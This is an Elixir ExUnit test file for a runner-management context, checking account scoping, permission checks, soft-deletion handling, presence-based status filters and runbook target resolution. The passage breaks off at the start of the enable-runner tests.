defmodule Emisar.RunnersTest do
  use Emisar.DataCase, async: true
  alias Emisar.Accounts
  alias Emisar.Accounts.RunnerAccess
  alias Emisar.Audit
  alias Emisar.Auth.Subject
  alias Emisar.Billing
  alias Emisar.Fixtures
  alias Emisar.Repo
  alias Emisar.RequestContext
  alias Emisar.Runners
  alias Emisar.Runners.{EnrollmentKey, Presence, Runner, Token}

  defp account_with_owner_subject do
    user = Fixtures.Users.create_user()
    account = Fixtures.Accounts.create_account()

    _ =
      Fixtures.Memberships.create_membership(
        account_id: account.id,
        user_id: user.id,
        role: "owner"
      )

    subject = Fixtures.Subjects.subject_for(user, account, role: :owner)
    {account, user, subject}
  end

  defp filter_names(subject, status) do
    {:ok, runners, _} = Runners.list_runners_for_account(subject, status: status)
    runners |> Enum.map(& &1.name) |> Enum.sort()
  end

  defp track_presence_meta(topic, runner_id, meta) do
    pid =
      spawn(fn ->
        receive do
          :stop -> :ok
        end
      end)

    {:ok, _ref} = Presence.track(pid, topic, runner_id, meta)
    on_exit(fn -> send(pid, :stop) end)
  end

  describe "runner_labels_for_ids/2" do
    test "returns a %{id => name} map for the supplied ids" do
      account = Fixtures.Accounts.create_account()

      r1 =
        Fixtures.Runners.create_runner(account_id: account.id, name: "alpha", connected?: false)

      r2 =
        Fixtures.Runners.create_runner(account_id: account.id, name: "bravo", connected?: false)

      assert Runners.runner_labels_for_ids(account.id, [r1.id, r2.id]) == %{
               r1.id => "alpha",
               r2.id => "bravo"
             }
    end

    test "another account's runner id resolves to nothing" do
      account = Fixtures.Accounts.create_account()
      mine = Fixtures.Runners.create_runner(account_id: account.id, name: "mine")
      theirs = Fixtures.Runners.create_runner(name: "theirs")

      # The lookup had no tenant filter at all: it resolved ANY account's runner
      # id to its name, one careless caller away from a cross-tenant leak.
      assert Runners.runner_labels_for_ids(account.id, [mine.id, theirs.id]) == %{
               mine.id => "mine"
             }
    end

    test "an empty id list short-circuits to an empty map (no query)" do
      account = Fixtures.Accounts.create_account()
      assert Runners.runner_labels_for_ids(account.id, []) == %{}
      # nils are dropped, so an all-nil list is also empty.
      assert Runners.runner_labels_for_ids(account.id, [nil, nil]) == %{}
    end

    test "still labels a SOFT-DELETED runner — deliberately all(), not not_deleted()" do
      # Runs + audit rows keep FKs to soft-deleted runners, so their labels must
      # still render in history views. The batcher uses all() for exactly this.
      {account, _user, subject} = account_with_owner_subject()
      runner = Fixtures.Runners.create_runner(account_id: account.id, name: "ghost")
      {:ok, _} = Runners.delete_runner(runner, subject)

      assert Runners.runner_labels_for_ids(account.id, [runner.id]) == %{runner.id => "ghost"}
    end
  end

  describe "runner_scope_facts_for_ids/2" do
    test "returns only bounded facts from the named account" do
      account = Fixtures.Accounts.create_account()
      other_account = Fixtures.Accounts.create_account()
      runner = Fixtures.Runners.create_runner(account_id: account.id, group: "database")
      other = Fixtures.Runners.create_runner(account_id: other_account.id)

      assert [%{id: id, group: "database"}] =
               Runners.runner_scope_facts_for_ids(account.id, [runner.id, other.id])

      assert id == runner.id
      assert Runners.runner_scope_facts_for_ids(account.id, List.duplicate(runner.id, 257)) == []
    end
  end

  describe "runner_selection_facts_for_account/3" do
    test "answers only the requested refs that live in the account" do
      account = Fixtures.Accounts.create_account()
      other_account = Fixtures.Accounts.create_account()
      runner = Fixtures.Runners.create_runner(account_id: account.id, group: "database")
      Fixtures.Runners.create_runner(account_id: account.id, group: "database")
      Fixtures.Runners.create_runner(account_id: account.id, group: "web")
      foreign = Fixtures.Runners.create_runner(account_id: other_account.id, group: "foreign")

      assert {:ok, facts} =
               Runners.runner_selection_facts_for_account(
                 account.id,
                 ["database", "foreign", "unknown"],
                 [runner.id, foreign.id]
               )

      # The unrequested "web" group, the other account's group, and its runner
      # all stay missing — and a requested group answers once, never once per
      # member.
      assert facts.groups == ["database"]
      assert facts.runners == [%{id: runner.id, group: "database"}]
    end

    test "a deleted runner takes its group and its id with it" do
      account = Fixtures.Accounts.create_account()
      runner = Fixtures.Runners.create_runner(account_id: account.id, group: "database")
      Fixtures.Runners.mark_deleted(runner)

      assert Runners.runner_selection_facts_for_account(account.id, ["database"], [runner.id]) ==
               {:ok, %{groups: [], runners: []}}
    end

    test "an invalid account, ref, or over-long selection fails closed" do
      account = Fixtures.Accounts.create_account()

      assert Runners.runner_selection_facts_for_account("not-a-uuid", ["database"], []) ==
               {:error, :invalid_runner_scope}

      assert Runners.runner_selection_facts_for_account(account.id, [], ["not-a-uuid"]) ==
               {:error, :invalid_runner_scope}

      assert Runners.runner_selection_facts_for_account(
               account.id,
               List.duplicate("database", 257),
               []
             ) == {:error, :invalid_runner_scope}

      assert Runners.runner_selection_facts_for_account(
               account.id,
               [],
               List.duplicate(Ecto.UUID.generate(), 257)
             ) == {:error, :invalid_runner_scope}

      assert Runners.runner_selection_facts_for_account(
               account.id,
               List.duplicate("database", 128),
               List.duplicate(Ecto.UUID.generate(), 129)
             ) == {:error, :invalid_runner_scope}
    end
  end

  describe "runner_filters/0" do
    test "carries the Runners table's filters in panel order" do
      assert Enum.map(Runners.runner_filters(), & &1.name) == [:group, :name]
    end
  end

  describe "list_runners_for_account/2" do
    test "filters by account, group, and status" do
      {account, _user, subject} = account_with_owner_subject()
      other_account = Fixtures.Accounts.create_account()

      _ = Fixtures.Runners.create_runner(account_id: account.id, group: "web", connected?: true)
      _ = Fixtures.Runners.create_runner(account_id: account.id, group: "db", connected?: false)
      _ = Fixtures.Runners.create_runner(account_id: other_account.id, group: "web")

      assert {:ok, list, _} = Runners.list_runners_for_account(subject)
      assert length(list) == 2
      assert {:ok, list, _} = Runners.list_runners_for_account(subject, group: "web")
      assert length(list) == 1

      # connected? tracks presence from this process, so the "connected"
      # filter resolves the online id set and returns just that runner.
      assert {:ok, list, _} = Runners.list_runners_for_account(subject, status: "connected")
      assert length(list) == 1
    end

    test "the status filter resolves each connection state via presence ids" do
      {account, _user, subject} = account_with_owner_subject()
      topic = Presence.topic(account.id)

      _online =
        Fixtures.Runners.create_runner(account_id: account.id, name: "r-online", connected?: true)

      _pending =
        Fixtures.Runners.create_runner(
          account_id: account.id,
          name: "r-pending",
          connected?: false
        )

      # Connected then dropped from presence = "disconnected": last_connected_at
      # is set but the socket is no longer live.
      disc =
        Fixtures.Runners.create_runner(account_id: account.id, name: "r-disc", connected?: true)

      :ok = Presence.untrack(self(), topic, disc.id)

      disabled =
        Fixtures.Runners.create_runner(
          account_id: account.id,
          name: "r-disabled",
          connected?: false
        )

      {:ok, _} = Runners.disable_runner(disabled, subject)

      assert filter_names(subject, "connected") == ["r-online"]
      assert filter_names(subject, "disconnected") == ["r-disc"]
      assert filter_names(subject, "pending") == ["r-pending"]
      assert filter_names(subject, "disabled") == ["r-disabled"]
    end

    test "decorates online?, action_load + last heartbeat from presence" do
      {account, _user, subject} = account_with_owner_subject()
      runner = Fixtures.Runners.create_runner(account_id: account.id, connected?: true)

      {:ok, _runner} =
        Runners.record_heartbeat(
          account.id,
          runner.id,
          runner.connection_generation,
          runner.connection_lease_id,
          5
        )

      assert {:ok, [listed], _} = Runners.list_runners_for_account(subject)
      assert listed.online?
      assert listed.action_load == 5
    end

    test "a viewer subject (no view_runners) is unauthorized" do
      account = Fixtures.Accounts.create_account()
      no_view = %Subject{account: account, role: :runner, permissions: MapSet.new()}

      assert {:error, :unauthorized} = Runners.list_runners_for_account(no_view)
    end
  end

  describe "list_all_runners_for_account/1" do
    test "returns every scoped runner — no pagination cap — decorated + account-scoped" do
      {account, _user, subject} = account_with_owner_subject()

      # 40 runners — past the paginator's 35-row default page.
      for _ <- 1..40,
          do: Fixtures.Runners.create_runner(account_id: account.id, connected?: false)

      {:ok, all} = Runners.list_all_runners_for_account(subject)
      assert length(all) == 40
      # Presence-decorated: the virtual field is populated, not left unloaded.
      assert Enum.all?(all, &(&1.online? == false))

      # The UI reader is deliberately left paginated.
      assert {:ok, paged, _meta} = Runners.list_runners_for_account(subject)
      assert length(paged) == 35

      # Another account sees none of them.
      {_other, _u, other_subject} = account_with_owner_subject()
      assert {:ok, []} = Runners.list_all_runners_for_account(other_subject)
    end

    test "a subject without a membership sees no runners" do
      {account, _user, subject} = account_with_owner_subject()
      Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      subject = %{subject | membership_id: nil}

      assert {:ok, []} = Runners.list_all_runners_for_account(subject)
      assert {:ok, [], _metadata} = Runners.list_runners_for_account(subject)
    end

    test "a viewer subject (no view_runners) is unauthorized" do
      account = Fixtures.Accounts.create_account()
      no_view = %Subject{account: account, role: :runner, permissions: MapSet.new()}

      assert {:error, :unauthorized} = Runners.list_all_runners_for_account(no_view)
    end
  end

  describe "list_pack_advertisement_facts_for_account/2" do
    test "returns each runner's identity and advertised packs, ordered by group then name" do
      account = Fixtures.Accounts.create_account()

      second =
        Fixtures.Runners.create_runner(
          account_id: account.id,
          name: "web-01",
          group: "prod",
          connected?: false
        )

      first =
        Fixtures.Runners.create_runner(
          account_id: account.id,
          name: "db-01",
          group: "prod",
          connected?: false
        )

      Fixtures.Runners.advertise_packs(first, %{"acme" => %{"version" => "1.0"}})

      assert {:ok, facts, %{coverage: :complete}} =
               Runners.list_pack_advertisement_facts_for_account(account.id, 10)

      assert facts == [
               %{
                 id: first.id,
                 name: "db-01",
                 group: "prod",
                 packs: %{"acme" => %{"version" => "1.0"}}
               },
               %{id: second.id, name: "web-01", group: "prod", packs: %{}}
             ]
    end

    test "a fleet past the limit is trimmed and reported as partial" do
      account = Fixtures.Accounts.create_account()

      for _ <- 1..3 do
        Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      end

      assert {:ok, facts, %{coverage: :partial}} =
               Runners.list_pack_advertisement_facts_for_account(account.id, 2)

      assert length(facts) == 2

      # Exactly at the limit is still complete — the sentinel row is what
      # distinguishes "the fleet fits" from "there is more".
      assert {:ok, all, %{coverage: :complete}} =
               Runners.list_pack_advertisement_facts_for_account(account.id, 3)

      assert length(all) == 3
    end

    test "a soft-deleted runner is left out" do
      account = Fixtures.Accounts.create_account()
      runner = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      Fixtures.Runners.mark_deleted(runner)

      assert {:ok, [], %{coverage: :complete}} =
               Runners.list_pack_advertisement_facts_for_account(account.id, 10)
    end

    test "never returns another account's runners" do
      account_a = Fixtures.Accounts.create_account()
      account_b = Fixtures.Accounts.create_account()
      runner_a = Fixtures.Runners.create_runner(account_id: account_a.id, connected?: false)
      Fixtures.Runners.create_runner(account_id: account_b.id, connected?: false)

      assert {:ok, [%{id: id}], %{coverage: :complete}} =
               Runners.list_pack_advertisement_facts_for_account(account_a.id, 10)

      assert id == runner_a.id
    end
  end

  describe "resolve_runbook_targets/2" do
    test "resolves every authored reference through current account scope" do
      {account, _user, subject} = account_with_owner_subject()
      runner = Fixtures.Runners.create_runner(account_id: account.id, group: "database")

      assert {:ok,
              %{
                selection: "all",
                refs: ["group:database"],
                runners: [%{id: runner_id, runner_ref: runner_ref}]
              }} =
               Runners.resolve_runbook_targets(
                 %{"selection" => "all", "refs" => ["group:database"]},
                 subject
               )

      assert runner_id == runner.id
      assert is_binary(runner_ref)

      assert Runners.resolve_runbook_targets(
               %{"selection" => "all", "refs" => ["group:missing"]},
               subject
             ) == {:error, :unknown_target}

      _offline =
        Fixtures.Runners.create_runner(
          account_id: account.id,
          group: "offline-only",
          connected?: false
        )

      assert Runners.resolve_runbook_targets(
               %{"selection" => "random_one", "refs" => ["group:offline-only"]},
               subject
             ) == {:error, :unknown_target}
    end
  end

  describe "resolve_runbook_target_sets/2" do
    test "preserves target order and reports the first unresolved target index" do
      {account, _user, subject} = account_with_owner_subject()
      first = Fixtures.Runners.create_runner(account_id: account.id, group: "database")
      second = Fixtures.Runners.create_runner(account_id: account.id, group: "web")

      assert {:ok,
              [
                %{selection: "all", runners: [%{id: first_id}]},
                %{selection: "random_one", group: "web", runners: [%{id: second_id}]}
              ]} =
               Runners.resolve_runbook_target_sets(
                 [
                   %{"selection" => "all", "refs" => ["group:database"]},
                   %{"selection" => "random_one", "refs" => ["group:web"]}
                 ],
                 subject
               )

      assert {first_id, second_id} == {first.id, second.id}

      assert Runners.resolve_runbook_target_sets(
               [
                 %{"selection" => "all", "refs" => ["group:database"]},
                 %{"selection" => "all", "refs" => ["runner:missing"]}
               ],
               subject
             ) == {:error, {:unknown_target, 1}}
    end
  end

  describe "public_ref/1" do
    test "derives a stable readable reference without exposing external identity" do
      runner =
        Fixtures.Runners.create_runner(
          name: "database-1",
          external_id: "customer-host-identity",
          connected?: false
        )

      assert {:ok, "database-1~" <> digest} = Runners.public_ref(runner)
      assert byte_size(digest) == 32
      refute digest =~ runner.external_id

      assert Runners.public_ref(%Runner{name: "bad name", external_id: "id"}) ==
               {:error, :invalid_runner}
    end
  end

  describe "available_runbook_targets/1" do
    test "offers only enabled, online runners with a representable ref" do
      {account, _user, subject} = account_with_owner_subject()
      online = Fixtures.Runners.create_runner(account_id: account.id, group: "database")
      offline = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      disabled = Fixtures.Runners.create_runner(account_id: account.id)
      Fixtures.Runners.disable_runner(disabled)

      assert {:ok, runners} = Runners.list_all_runners_for_account(subject)

      assert [target] = Runners.available_runbook_targets(runners)
      assert target.id == online.id
      assert target.name == online.name
      assert target.group == "database"
      assert {:ok, target.runner_ref} == Runners.public_ref(online)

      refute Enum.any?([offline.id, disabled.id], &(&1 == target.id))
    end
  end

  describe "select_runbook_target_runners/2" do
    test "resolves group and runner refs, and fails the whole set on an unknown ref" do
      {account, _user, subject} = account_with_owner_subject()
      first = Fixtures.Runners.create_runner(account_id: account.id, group: "database")
      second = Fixtures.Runners.create_runner(account_id: account.id, group: "web")

      assert {:ok, runners} = Runners.list_all_runners_for_account(subject)
      available = Runners.available_runbook_targets(runners)
      assert {:ok, second_ref} = Runners.public_ref(second)

      assert {:ok, [%{id: selected_id}]} =
               Runners.select_runbook_target_runners(["group:database"], available)

      assert selected_id == first.id

      assert {:ok, both} =
               Runners.select_runbook_target_runners(
                 ["group:database", "runner:" <> second_ref],
                 available
               )

      assert Enum.map(both, & &1.id) |> Enum.sort() == Enum.sort([first.id, second.id])

      assert Runners.select_runbook_target_runners(["group:database", "group:absent"], available) ==
               {:error, :unknown_target}

      assert Runners.select_runbook_target_runners(["nonsense"], available) ==
               {:error, :unknown_target}
    end
  end

  describe "list_group_summaries/1" do
    test "returns {group, count} tuples for the account's non-deleted runners" do
      {account, _user, subject} = account_with_owner_subject()
      _ = Fixtures.Runners.create_runner(account_id: account.id, group: "web", connected?: false)
      _ = Fixtures.Runners.create_runner(account_id: account.id, group: "web", connected?: false)
      _ = Fixtures.Runners.create_runner(account_id: account.id, group: "db", connected?: false)

      assert {:ok, rows} = Runners.list_group_summaries(subject)
      assert Enum.sort(rows) == [{"db", 1}, {"web", 2}]
    end

    test "is account-scoped — another account's groups don't leak in" do
      {_account_a, _ua, subject_a} = account_with_owner_subject()
      other = Fixtures.Accounts.create_account()
      _ = Fixtures.Runners.create_runner(account_id: other.id, group: "secret", connected?: false)

      assert {:ok, []} = Runners.list_group_summaries(subject_a)
    end

    test "a viewer subject (no view_runners) is unauthorized" do
      account = Fixtures.Accounts.create_account()
      no_view = %Subject{account: account, role: :runner, permissions: MapSet.new()}

      assert {:error, :unauthorized} = Runners.list_group_summaries(no_view)
    end
  end

  describe "fetch_runner_by_id/3" do
    setup do
      {account, _user, subject} = account_with_owner_subject()
      %{account: account, subject: subject}
    end

    test "fetches a non-deleted runner by id, presence-decorated", %{
      account: account,
      subject: subject
    } do
      runner = Fixtures.Runners.create_runner(account_id: account.id, connected?: true)

      {:ok, _runner} =
        Runners.record_heartbeat(
          account.id,
          runner.id,
          runner.connection_generation,
          runner.connection_lease_id,
          5
        )

      assert {:ok, fetched} = Runners.fetch_runner_by_id(runner.id, subject)
      assert fetched.id == runner.id
      assert fetched.online?
      assert fetched.action_load == 5
      assert %DateTime{} = fetched.last_heartbeat_at
    end

    test "a malformed (non-UUID) id is :not_found, never a crash", %{subject: subject} do
      assert {:error, :not_found} = Runners.fetch_runner_by_id("not-a-uuid", subject)
    end

    test "a runner in another account is :not_found (cross-account isolation)", %{
      subject: subject_a
    } do
      account_b = Fixtures.Accounts.create_account()
      runner_b = Fixtures.Runners.create_runner(account_id: account_b.id)

      assert {:error, :not_found} = Runners.fetch_runner_by_id(runner_b.id, subject_a)
    end

    test "a subject without view_runners is unauthorized", %{account: account} do
      runner = Fixtures.Runners.create_runner(account_id: account.id)
      no_view = %Subject{account: account, role: :runner, permissions: MapSet.new()}

      assert {:error, :unauthorized} = Runners.fetch_runner_by_id(runner.id, no_view)
    end
  end

  describe "fetch_runner_by_name/3" do
    setup do
      {_user, account, subject} = Fixtures.Subjects.owner_subject()
      %{account: account, subject: subject}
    end

    test "fetches a non-deleted runner by its account-unique name", %{
      account: account,
      subject: subject
    } do
      runner = Fixtures.Runners.create_runner(account_id: account.id, name: "host-1")

      assert {:ok, fetched} = Runners.fetch_runner_by_name("host-1", subject)
      assert fetched.id == runner.id
    end

    test "not_found for an unknown name", %{subject: subject} do
      assert {:error, :not_found} = Runners.fetch_runner_by_name("nope", subject)
    end

    test "cross-account: a name in another account doesn't resolve", %{subject: subject_a} do
      account_b = Fixtures.Accounts.create_account()
      _runner = Fixtures.Runners.create_runner(account_id: account_b.id, name: "host-b")

      assert {:error, :not_found} = Runners.fetch_runner_by_name("host-b", subject_a)
    end

    test "denial: a subject without view_runners is unauthorized", %{account: account} do
      _runner = Fixtures.Runners.create_runner(account_id: account.id, name: "host-1")
      no_view = %Subject{account: account, role: :runner, permissions: MapSet.new()}

      assert {:error, :unauthorized} = Runners.fetch_runner_by_name("host-1", no_view)
    end
  end

  describe "runner_active_in_account?/2" do
    test "true for a live, non-disabled runner in the account" do
      runner = Fixtures.Runners.create_runner(connected?: false)
      assert Runners.runner_active_in_account?(runner.id, runner.account_id)
    end

    test "false for a disabled runner (a disabled runner refuses new dispatch)" do
      {account, _user, subject} = account_with_owner_subject()
      runner = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      {:ok, _} = Runners.disable_runner(runner, subject)

      refute Runners.runner_active_in_account?(runner.id, account.id)
    end

    test "false for a soft-deleted runner" do
      {account, _user, subject} = account_with_owner_subject()
      runner = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      {:ok, _} = Runners.delete_runner(runner, subject)

      refute Runners.runner_active_in_account?(runner.id, account.id)
    end

    test "false across accounts — the runner isn't active in a different account" do
      runner = Fixtures.Runners.create_runner(connected?: false)
      other = Fixtures.Accounts.create_account()

      refute Runners.runner_active_in_account?(runner.id, other.id)
    end
  end

  describe "runner_in_account?/3" do
    test "true for an account runner, including a disabled one" do
      {account, _user, subject} = account_with_owner_subject()
      runner = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      assert Runners.runner_in_account?(runner.id, account.id)

      # Disable is recoverable, so the runner still counts (its policy
      # override stays editable while it's offline).
      {:ok, _} = Runners.disable_runner(runner, subject)
      assert Runners.runner_in_account?(runner.id, account.id)
    end

    test "false for a soft-deleted runner" do
      {account, _user, subject} = account_with_owner_subject()
      runner = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      {:ok, _} = Runners.delete_runner(runner, subject)

      refute Runners.runner_in_account?(runner.id, account.id)
    end

    test "false across accounts and for a malformed id" do
      runner = Fixtures.Runners.create_runner(connected?: false)
      other = Fixtures.Accounts.create_account()

      refute Runners.runner_in_account?(runner.id, other.id)
      refute Runners.runner_in_account?("not-a-uuid", other.id)
    end
  end

  describe "any_runner_bootstrapped_by_key?/3" do
    test "true when a listed runner registered with that key" do
      account = Fixtures.Accounts.create_account()
      {_raw, key} = Fixtures.Runners.create_enrollment_key(account_id: account.id)

      runner =
        Fixtures.Runners.create_runner(
          account_id: account.id,
          bootstrap_enrollment_key_id: key.id,
          connected?: false
        )

      assert Runners.any_runner_bootstrapped_by_key?([runner.id], key.id, account.id)
    end

    test "false when the listed runner registered with a different key" do
      account = Fixtures.Accounts.create_account()
      {_raw, key} = Fixtures.Runners.create_enrollment_key(account_id: account.id)
      {_raw, other_key} = Fixtures.Runners.create_enrollment_key(account_id: account.id)

      runner =
        Fixtures.Runners.create_runner(
          account_id: account.id,
          bootstrap_enrollment_key_id: other_key.id,
          connected?: false
        )

      refute Runners.any_runner_bootstrapped_by_key?([runner.id], key.id, account.id)
    end

    test "false when the key's runner exists but its id isn't in the list" do
      account = Fixtures.Accounts.create_account()
      {_raw, key} = Fixtures.Runners.create_enrollment_key(account_id: account.id)

      _bootstrapped =
        Fixtures.Runners.create_runner(
          account_id: account.id,
          bootstrap_enrollment_key_id: key.id,
          connected?: false
        )

      unrelated = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)

      # The install page checks only the runners that just joined presence — a
      # different runner from the same key connecting elsewhere mustn't count.
      refute Runners.any_runner_bootstrapped_by_key?([unrelated.id], key.id, account.id)
    end

    test "false across accounts — scoped to the given account only" do
      account = Fixtures.Accounts.create_account()
      {_raw, key} = Fixtures.Runners.create_enrollment_key(account_id: account.id)

      runner =
        Fixtures.Runners.create_runner(
          account_id: account.id,
          bootstrap_enrollment_key_id: key.id,
          connected?: false
        )

      other = Fixtures.Accounts.create_account()

      refute Runners.any_runner_bootstrapped_by_key?([runner.id], key.id, other.id)
    end
  end

  describe "runner_enforces_signatures?/2" do
    test "true for an enforcing runner, false for a plain one" do
      enforcing = Fixtures.Runners.create_runner(enforce_signatures: true)
      plain = Fixtures.Runners.create_runner()

      assert Runners.runner_enforces_signatures?(enforcing.id, enforcing.account_id)
      refute Runners.runner_enforces_signatures?(plain.id, plain.account_id)
    end

    test "is account-scoped — the enforcing runner doesn't enforce in another account" do
      account_b = Fixtures.Accounts.create_account()
      runner = Fixtures.Runners.create_runner(enforce_signatures: true)

      assert Runners.runner_enforces_signatures?(runner.id, runner.account_id)
      refute Runners.runner_enforces_signatures?(runner.id, account_b.id)
    end
  end

  describe "list_active_runners_in_groups/2" do
    test "returns active runners in the groups, name-ordered" do
      account = Fixtures.Accounts.create_account()

      _b =
        Fixtures.Runners.create_runner(
          account_id: account.id,
          group: "web",
          name: "bravo",
          connected?: false
        )

      _a =
        Fixtures.Runners.create_runner(
          account_id: account.id,
          group: "web",
          name: "alpha",
          connected?: false
        )

      _other =
        Fixtures.Runners.create_runner(account_id: account.id, group: "db", connected?: false)

      names =
        Runners.list_active_runners_in_groups(account.id, ["web"]) |> Enum.map(& &1.name)

      assert names == ["alpha", "bravo"]
    end

    test "an empty group list short-circuits to []" do
      assert Runners.list_active_runners_in_groups(Ecto.UUID.generate(), []) == []
    end

    test "excludes disabled and soft-deleted runners" do
      {account, _user, subject} = account_with_owner_subject()

      live =
        Fixtures.Runners.create_runner(account_id: account.id, group: "web", connected?: false)

      disabled =
        Fixtures.Runners.create_runner(account_id: account.id, group: "web", connected?: false)

      {:ok, _} = Runners.disable_runner(disabled, subject)

      deleted =
        Fixtures.Runners.create_runner(account_id: account.id, group: "web", connected?: false)

      {:ok, _} = Runners.delete_runner(deleted, subject)

      ids = Runners.list_active_runners_in_groups(account.id, ["web"]) |> Enum.map(& &1.id)
      assert ids == [live.id]
    end

    test "is account-scoped — another account's same-group runner is excluded" do
      account_a = Fixtures.Accounts.create_account()
      account_b = Fixtures.Accounts.create_account()

      _ =
        Fixtures.Runners.create_runner(account_id: account_b.id, group: "web", connected?: false)

      assert Runners.list_active_runners_in_groups(account_a.id, ["web"]) == []
    end
  end

  describe "count_billable_runners/1" do
    test "counts active runners as an integer; +1 per added runner" do
      account = Fixtures.Accounts.create_account()

      assert Runners.count_billable_runners(account.id) == 0
      assert is_integer(Runners.count_billable_runners(account.id))

      _ = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      assert Runners.count_billable_runners(account.id) == 1
    end

    test "disabled and soft-deleted runners don't occupy a slot" do
      {account, _user, subject} = account_with_owner_subject()
      _live = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      disabled = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      deleted = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)

      {:ok, _} = Runners.disable_runner(disabled, subject)
      {:ok, _} = Runners.delete_runner(deleted, subject)

      assert Runners.count_billable_runners(account.id) == 1
    end

    test "is account-scoped" do
      account_a = Fixtures.Accounts.create_account()
      account_b = Fixtures.Accounts.create_account()
      _ = Fixtures.Runners.create_runner(account_id: account_b.id, connected?: false)

      assert Runners.count_billable_runners(account_a.id) == 0
    end
  end

  describe "connection_counts/0 (fleet-wide telemetry sampler)" do
    test "an empty fleet is all zeros" do
      assert %{connected: 0, disconnected: 0, never_connected: 0, disabled: 0} =
               Runners.connection_counts()
    end

    test "classifies each connection-record state, fleet-wide across accounts" do
      now = DateTime.utc_now()
      earlier = DateTime.add(now, -60, :second)

      # `connected?: false` skips the fixture's last_connected_at stamp + presence
      # tracking, so each test sets exactly the connection-record state it wants.
      never = fn -> Fixtures.Runners.create_runner(connected?: false) end

      # never-connected: no connection timestamps, across two accounts.
      _ = never.()

      _ =
        Fixtures.Runners.create_runner(
          connected?: false,
          account_id: Fixtures.Accounts.create_account().id
        )

      # connected: last connect is the most recent event (no disconnect, or older).
      _ = never.() |> put_connection(last_connected_at: now)
      _ = never.() |> put_connection(last_connected_at: now, last_disconnected_at: earlier)

      # disconnected: last disconnect is at/after the last connect.
      _ = never.() |> put_connection(last_connected_at: earlier, last_disconnected_at: now)

      # disabled: counted as disabled regardless of its connection timestamps.
      _ = never.() |> put_connection(last_connected_at: now, disabled_at: now)

      # deleted: excluded from every bucket.
      _ = never.() |> put_connection(last_connected_at: now, deleted_at: now)

      assert %{connected: 2, disconnected: 1, never_connected: 2, disabled: 1} =
               Runners.connection_counts()
    end
  end

  describe "peek_runner_by_id/1" do
    test "returns the runner struct for a live id" do
      runner = Fixtures.Runners.create_runner(connected?: false)
      assert %Runner{id: id} = Runners.peek_runner_by_id(runner.id)
      assert id == runner.id
    end

    test "returns nil for a soft-deleted runner" do
      {account, _user, subject} = account_with_owner_subject()
      runner = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      {:ok, _} = Runners.delete_runner(runner, subject)

      assert is_nil(Runners.peek_runner_by_id(runner.id))
    end

    test "returns nil for an unused or malformed id (no crash)" do
      assert is_nil(Runners.peek_runner_by_id(Ecto.UUID.generate()))
      assert is_nil(Runners.peek_runner_by_id("not-a-uuid"))
    end
  end

  describe "fetch_runner_by_external_id_for_account/3" do
    test "resolves a live runner by (account, external_id)" do
      account = Fixtures.Accounts.create_account()
      runner = Fixtures.Runners.create_runner(account_id: account.id, external_id: "ext-1")

      assert {:ok, %Runner{id: id}} =
               Runners.fetch_runner_by_external_id_for_account("ext-1", account.id)

      assert id == runner.id
    end

    test "is account-scoped — the same external_id in another account is :not_found" do
      account_a = Fixtures.Accounts.create_account()
      account_b = Fixtures.Accounts.create_account()
      _ = Fixtures.Runners.create_runner(account_id: account_a.id, external_id: "shared")

      assert {:error, :not_found} =
               Runners.fetch_runner_by_external_id_for_account("shared", account_b.id)
    end

    test "a soft-deleted runner no longer resolves (frees its external_id)" do
      {account, _user, subject} = account_with_owner_subject()
      runner = Fixtures.Runners.create_runner(account_id: account.id, external_id: "recycle")
      {:ok, _} = Runners.delete_runner(runner, subject)

      assert {:error, :not_found} =
               Runners.fetch_runner_by_external_id_for_account("recycle", account.id)
    end
  end

  describe "fetch_and_lock_active_runner/3" do
    test "locks an active runner in the account and rejects a disabled runner" do
      {account, _user, subject} = account_with_owner_subject()
      runner = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)

      assert {:ok, {:ok, %Runner{id: id}}} =
               Repo.transaction(fn ->
                 Runners.fetch_and_lock_active_runner(runner.id, account.id, repo: Repo)
               end)

      assert id == runner.id

      {:ok, _disabled} = Runners.disable_runner(runner, subject)

      assert {:ok, {:error, :not_found}} =
               Repo.transaction(fn ->
                 Runners.fetch_and_lock_active_runner(runner.id, account.id, repo: Repo)
               end)
    end
  end

  describe "fetch_and_lock_connection_owner/5" do
    test "locks only the current connection lease" do
      runner = Fixtures.Runners.create_runner(connected?: true)

      assert {:ok, {:ok, %Runner{id: id}}} =
               Repo.transaction(fn ->
                 Runners.fetch_and_lock_connection_owner(
                   runner.account_id,
                   runner.id,
                   runner.connection_generation,
                   runner.connection_lease_id,
                   repo: Repo
                 )
               end)

      assert id == runner.id

      assert {:ok, {:error, :not_found}} =
               Repo.transaction(fn ->
                 Runners.fetch_and_lock_connection_owner(
                   runner.account_id,
                   runner.id,
                   runner.connection_generation,
                   Ecto.UUID.generate(),
                   repo: Repo
                 )
               end)
    end
  end

  describe "disable_runner/2" do
    setup do
      {account, _user, subject} = account_with_owner_subject()
      %{account: account, subject: subject}
    end

    test "sets disabled_at and broadcasts :runner_socket_disabled to drop the live socket", %{
      account: account,
      subject: subject
    } do
      runner = Fixtures.Runners.create_runner(account_id: account.id)
      # The live socket subscribes to the transport topic at connect; the
      # broadcast drops an already-open (now disabled) runner's session.
      Runners.subscribe_runner_transport(runner)

      assert {:ok, %Runner{disabled_at: %DateTime{}}} = Runners.disable_runner(runner, subject)
      assert_receive :runner_socket_disabled
    end

    test "a viewer (no manage_runners) is refused", %{account: account} do
      runner = Fixtures.Runners.create_runner(account_id: account.id)

      assert {:error, :unauthorized} = Runners.disable_runner(runner, viewer_subject_for(account))
    end

    test "won't touch a runner in another account (cross-account → :not_found)" do
      {account_a, _ua, _owner_a} = account_with_owner_subject()
      {_account_b, _ub, owner_b} = account_with_owner_subject()
      runner_a = Fixtures.Runners.create_runner(account_id: account_a.id)

      assert {:error, :not_found} = Runners.disable_runner(runner_a, owner_b)
    end
  end

  describe "enable_runner/2" do
    setup do
